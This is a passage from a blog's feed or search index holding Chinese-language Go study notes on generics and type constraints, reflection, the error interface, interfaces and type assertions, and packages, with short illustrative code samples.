go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Tree[T])</span></span>LookUp(x T) *Tree[T] &#123;</span><br><span class="line"><span class="comment">//具体代码...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用泛型类型必须先进行实例化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stringTree Tree[<span class="type">string</span>]</span><br></pre></td></tr></table></figure><p><strong>类型约束</strong></p><p>类似参数列表中每个参数都有对应的参数类型，类型参数列表中的每一个参数都有对应的类型约束。</p><p>在Go语言中，实现类型约束的是接口类型。在上面的例子中，我们对于类型约束都省略了一个外层<code>interface&#123;&#125;</code>，这是通常的写法，但实际上类型约束是一个接口类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类型约束字面量，通常外层interface&#123;&#125;可省略</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span>[<span class="title">T</span> <span class="title">interface</span></span>&#123; <span class="type">int</span> | <span class="type">float64</span> &#125;](a, b T) T &#123;</span><br><span class="line"><span class="keyword">if</span> a &lt;= b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作为类型约束的接口类型可以事先定义且支持复用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 事先定义好的类型约束类型</span></span><br><span class="line"><span class="keyword">type</span> Value <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="type">int</span> | <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span>[<span class="title">T</span> <span class="title">Value</span>]<span class="params">(a, b T)</span></span> T &#123;</span><br><span class="line"><span class="keyword">if</span> a &lt;= b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（10）：反射</title>
      <link href="/2023/02/09/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%EF%BC%9A%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/02/09/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%EF%BC%9A%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="反射介绍">反射介绍</h2><p>反射指的是再程序运行期间对程序本身进行访问和修改的能力。</p><p>Go程序在运行期间使用reflect包访问程序的反射信息，包括字段名称、类型信息、结构体信息等。</p><p>一个具体的例子是，空接口可以存储任意类型的变量，那我们如何知道这个空接口保存的数据是什么呢？ 反射就是在运行时动态的获取一个变量的类型信息和值信息。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（9）：Error接口</title>
      <link href="/2023/02/09/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%EF%BC%9AError%E6%8E%A5%E5%8F%A3/"/>
      <url>/2023/02/09/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%EF%BC%9AError%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="error接口">Error接口</h2><p>Go语言不支持其他语言使用try/catch方式捕获处理错误，而是将错误作为一种特殊的值来处理。</p><p>Go语言使用了一个名为 <code>error</code> 接口来表示错误类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个函数或方法需要返回错误时，我们通常是把错误作为最后一个返回值。例如下面标准库 os 中打开文件的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Open</span><span class="params">(name <span class="type">string</span>)</span></span> (*File, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> OpenFile(name, O_RDONLY, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="errors-new">errors.New</h3><p>创建错误的最简单的方式就用errors.New()函数来创建一个错误</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">queryById</span><span class="params">(id <span class="type">int64</span>)</span></span> (*Info, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> id &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;无效的id&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它接收一个字符串参数返回包含该字符串的错误。</p><h3 id="fmt-errorf">fmt.Errorf</h3><p>这个相当于是一个格式化版的New函数，可以格式化地创建一个错误。经常的，我们需要在传出的错误中包含一个错误，且将其错误进行二次包装，这时候我们使用<code>fmt.Errorf</code>时搭配使用特殊的格式化动词<code>%w</code>，可以实现基于已有的错误再包装得到一个新的错误。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Errorf(<span class="string">&quot;查询数据库失败，err:%w&quot;</span>, err)</span><br></pre></td></tr></table></figure><p>对于这种二次包装的错误，<code>errors</code>包中提供了以下三个方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unwrap</span><span class="params">(err <span class="type">error</span>)</span></span> <span class="type">error</span>                 <span class="comment">// 获得err包含下一层错误</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Is</span><span class="params">(err, target <span class="type">error</span>)</span></span> <span class="type">bool</span>              <span class="comment">// 判断err是否包含target</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">As</span><span class="params">(err <span class="type">error</span>, target <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">bool</span>  <span class="comment">// 判断err是否为target类型</span></span><br></pre></td></tr></table></figure><h3 id="错误结构体类型">错误结构体类型</h3><p>我们还可以自己定义结构体类型，来实现``error`接口。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OpError 自定义结构体类型</span></span><br><span class="line"><span class="keyword">type</span> OpError <span class="keyword">struct</span> &#123;</span><br><span class="line">Op <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Error OpError 类型实现error接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *OpError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;无权执行%s操作&quot;</span>, e.Op)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（8）：接口</title>
      <link href="/2023/02/06/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%EF%BC%9A%E6%8E%A5%E5%8F%A3/"/>
      <url>/2023/02/06/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%EF%BC%9A%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="接口">接口</h2><p>在Go语言中接口是一种类型，一种抽象的类型。Go语言的接口有别于具体类型的概念，无论是基础数据类型，还是结构体，它类似于一种协议，而不是具体内容。</p><p><strong>我简单的理解概括：</strong></p><p>只要A实现了B接口里的所有方法，则代表A就是B接口类型的具体实现（不需要显示表示出A、B关系），继而可以使用多态的方式，通过B接口类型去使用A对应的方法。</p><h3 id="接口定义">接口定义</h3><p>每个接口类型由一个或者多个方法签名组成</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> 接口类型名 <span class="keyword">interface</span>&#123;</span><br><span class="line">方法名<span class="number">1</span>( 参数列表<span class="number">1</span> ) 返回值列表<span class="number">1</span></span><br><span class="line">方法名<span class="number">2</span>( 参数列表<span class="number">2</span> ) 返回值列表<span class="number">2</span></span><br><span class="line">…</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>其中</strong></p><ul><li>接口类型名一般以<code>er</code>作结尾，体现出接口的具体含义</li><li>方法名首字母<strong>一般为大写</strong></li><li>参数列表和返回值列表中的参数变量名可以省略</li></ul><h3 id="实现接口">实现接口</h3><p>前面提到，接口就是一种协议，只要实现了接口中的所有方法就是实现了这个接口。并不需要显式的表明谁实现了谁。举个例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Sayer <span class="keyword">interface</span> &#123;</span><br><span class="line">Say()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给Cat添加一个Say方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span></span> Say() &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;喵喵喵&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时Cat便被称之为实现了Sayer接口</span></span><br></pre></td></tr></table></figure><p>我们看到，代码中没有显式的表明谁实现了谁，这就是Go语言中接口与其他语言不同之处。</p><h3 id="接口的作用">接口的作用</h3><p>那么，接口的作用是什么呢？我们前面也提到，接口可以用来实现多态，而这个就解释了接口的作用。</p><p>举个例子：</p><p>假设在这个程序中有猫狗两种动物，它们饿了都会发出叫声，因此我们正常来说，需要写四个方法，每两个方法分别是一种动物&quot;发出叫声&quot;和“饿了”。这时候来了一只羊，它饿了也会发出叫声，这时候我们又需要写两种方法，这非常麻烦。</p><p>我们发现，发出叫声和饿了都是它们会做的事情，为什么不能将它归类呢，只要一个饿了和不同叫声实现就可以完成这个需求，这个就是接口的作用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Sayer <span class="keyword">interface</span> &#123; Say() &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"><span class="keyword">type</span> Sheep <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span></span> Say() &#123; fmt.Printf(<span class="string">&quot;喵喵喵&quot;</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> Say() &#123; fmt.Printf(<span class="string">&quot;汪汪汪&quot;</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Sheep)</span></span> Say() &#123; fmt.Printf(<span class="string">&quot;咩咩咩&quot;</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MakeHunger</span><span class="params">(s Sayer)</span></span> &#123; s.Say() &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cat := Cat&#123;&#125;</span><br><span class="line">dog := Dog&#123;&#125;</span><br><span class="line">sheep := Sheep&#123;&#125;</span><br><span class="line">ani := []Sayer&#123;cat, dog, sheep&#125;</span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> ani &#123; MakeHunger(a) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口组合">接口组合</h3><p>接口与接口之间可以通过嵌套形成一个新的接口类型。对于这种由多个接口类型组合形成的新接口类型，实现了新接口类型中规定的所有方法即实现了该接口类型。go语言中的源码就有很多示例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/io/io.go</span></span><br><span class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span> &#123;</span><br><span class="line">Read(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Writer <span class="keyword">interface</span> &#123;</span><br><span class="line">Write(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Closer <span class="keyword">interface</span> &#123;</span><br><span class="line">Close() <span class="type">error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">Reader</span><br><span class="line">Writer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadCloser <span class="keyword">interface</span> &#123;</span><br><span class="line">Reader</span><br><span class="line">Closer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> WriteCloser <span class="keyword">interface</span> &#123;</span><br><span class="line">Writer</span><br><span class="line">Closer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口也可以作为结构体的一个字段，可以嵌套在结构体内。</p><p>结构体内嵌接口的目的是，可以使得服务初始化时，选择接口的不同的实现方法。</p><p>例如，对于一个保存文件的服务时，需要满足一个save接口，对于save这个实现，我们具有不同的实现方法，如本地保存、oss存储等，在初始化这个保存文件服务时，我们可以选择需要的方法放进去。接下来看一个假实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Saver <span class="keyword">interface</span> &#123;</span><br><span class="line">save() <span class="type">error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SaveService <span class="keyword">struct</span> &#123;</span><br><span class="line">Saver</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> LocalSave <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l LocalSave)</span></span> save() <span class="type">error</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Save in local!\n&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AliSave <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a AliSave)</span></span> save() <span class="type">error</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Save in AliOSS!\n&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">Save01 := SaveService&#123;</span><br><span class="line"><span class="built_in">new</span>(AliSave),</span><br><span class="line">&#125;</span><br><span class="line">err := Save01.save()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">Save02 := SaveService&#123;</span><br><span class="line"><span class="built_in">new</span>(LocalSave),</span><br><span class="line">&#125;</span><br><span class="line">err = Save02.save()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="空接口">空接口</h3><p>空接口是指没有定义任何方法的接口类型。因此任何类型都可以视为实现了空接口。也正是因为空接口类型的这个特性，空接口类型的变量可以存储任意类型的值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Any 不包含任何方法的空接口类型</span></span><br><span class="line"><span class="keyword">type</span> Any <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dog 狗结构体</span></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> x Any</span><br><span class="line"></span><br><span class="line">x = <span class="string">&quot;你好&quot;</span> <span class="comment">// 字符串型</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, x, x)</span><br><span class="line">x = <span class="number">100</span> <span class="comment">// int型</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, x, x)</span><br><span class="line">x = <span class="literal">true</span> <span class="comment">// 布尔型</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, x, x)</span><br><span class="line">x = Dog&#123;&#125; <span class="comment">// 结构体类型</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, x, x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="作用">作用</h4><p>在之前的笔记中就提到过这两个作用</p><p><strong>空接口作为函数的参数</strong></p><p>使用空接口实现可以接收任意类型的函数参数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 空接口作为函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">show</span><span class="params">(a <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, a, a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>空接口作为map的值</strong></p><p>使用空接口实现可以保存任意值的字典。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 空接口作为map值</span></span><br><span class="line"><span class="keyword">var</span> studentInfo = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">studentInfo[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;IceWindy&quot;</span></span><br><span class="line">studentInfo[<span class="string">&quot;age&quot;</span>] = <span class="number">18</span></span><br><span class="line">studentInfo[<span class="string">&quot;married&quot;</span>] = <span class="literal">false</span></span><br><span class="line">fmt.Println(studentInfo)</span><br></pre></td></tr></table></figure><h3 id="接口值">接口值</h3><p>由于接口类型的值可以是任意一个实现了该接口的类型值，所以接口值除了需要记录具体<strong>值</strong>之外，还需要记录这个值属于的<strong>类型</strong>。</p><p>也就是说接口值由“类型”和“值”组成，鉴于这两部分会根据存入值的不同而发生变化，我们称之为接口的<code>动态类型</code>和<code>动态值</code>。</p><p><img src="https://image.icewindy.cn/202302081843573.png" alt="image-20230208184359551"></p><p>接口值的详细理解可以看：<a href="https://www.liwenzhou.com/posts/Go/interface/#autoid-1-3-2">https://www.liwenzhou.com/posts/Go/interface/#autoid-1-3-2</a></p><h3 id="类型断言">类型断言</h3><p>类型断言是一个使用在接口值上的操作，用于检查接口类型变量所持有的值是否实现了期望的接口或者具体的类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value, ok := x.(T)</span><br></pre></td></tr></table></figure><p><code>x</code>表示一个接口类型的变量，<code>T</code>表示一个具体类型或是接口类型。</p><ul><li><p><code>value</code>是<code>x</code>转化为<code>T</code>类型后的变量</p></li><li><p><code>ok</code>是一个布尔值，若为<code>true</code>则表示断言成功，为<code>false</code>则表示断言失败。</p></li></ul><p>类型断言的作用就很清晰了，是作为对接口类型的变量进行判断并且获取到对应的实际值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n Mover = &amp;Dog&#123;Name: <span class="string">&quot;旺财&quot;</span>&#125;</span><br><span class="line">v, ok := n.(*Dog)</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;类型断言成功&quot;</span>)</span><br><span class="line">v.Name = <span class="string">&quot;富贵&quot;</span> <span class="comment">// 变量v是*Dog类型</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;类型断言失败&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果对一个接口值有多个实际类型需要判断，推荐使用<code>switch</code>语句来实现。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// justifyType 对传入的空接口类型变量x进行类型断言</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">justifyType</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="keyword">switch</span> v := x.(<span class="keyword">type</span>) &#123;</span><br><span class="line">    <span class="comment">//关键字type只能用在switch语句里，如果用在switch外面会报错。</span></span><br><span class="line"><span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">fmt.Printf(<span class="string">&quot;x is a string，value is %v\n&quot;</span>, v)</span><br><span class="line"><span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">fmt.Printf(<span class="string">&quot;x is a int is %v\n&quot;</span>, v)</span><br><span class="line"><span class="keyword">case</span> <span class="type">bool</span>:</span><br><span class="line">fmt.Printf(<span class="string">&quot;x is a bool is %v\n&quot;</span>, v)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;unsupport type！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（7）：包</title>
      <link href="/2023/02/06/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%EF%BC%9A%E5%8C%85/"/>
      <url>/2023/02/06/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%EF%BC%9A%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="包与依赖管理">包与依赖管理</h2><p>Go语言中支持模块化的开发理念，在Go语言中使用<code>包（package）</code>来支持代码模块化和代码复用。一个包是由一个或多个Go源码文件（.go结尾的文件）组成，是一种高级的代码复用方案，Go语言为我们提供了很多内置包，例如我们之前频繁使用的<code>fmt</code>包等。</p><h3 id="包-package">包 package</h3><h4 id="定义包">定义包</h4><p>一个包可以简单的理解为一个存放<code>.go</code>文件的文件夹，其中该文件夹内所有<code>.go</code>文件都要在非注释的第一行添加声明，声明该文件归属的包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 包名</span><br></pre></td></tr></table></figure><p>**注意：**一个文件夹内直接包含的文件只能归属于一个包，同一个包的文件不能在多个文件夹之下。</p><p>包名为<code>main</code>的包是go语言程序的入口包，编译后会得到一个可执行文件，非包含<code>main</code>包源代码编译则不会的到可执行文件。</p><h4 id="包的引入">包的引入</h4><p>通过<code>import</code>关键字可以引入另外一个包的内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importname <span class="string">&quot;path/to/package&quot;</span></span><br></pre></td></tr></table></figure><p>其中</p><ul><li>importname：命名引入的包在此处的名字，通常都省略。默认值为引入包的包名</li><li>path/to/package：引入包的路径名称，必须使用双引号包裹起来</li><li>Go语言中禁止循环导入包</li></ul><p>一般而言，import语句会放在位于package语句下方。</p><p>如果存在引入的多个包中存在相同的包名或是想为引入的包设置一个新包名，则需要用到通过<code>importname</code>指定一个名称</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 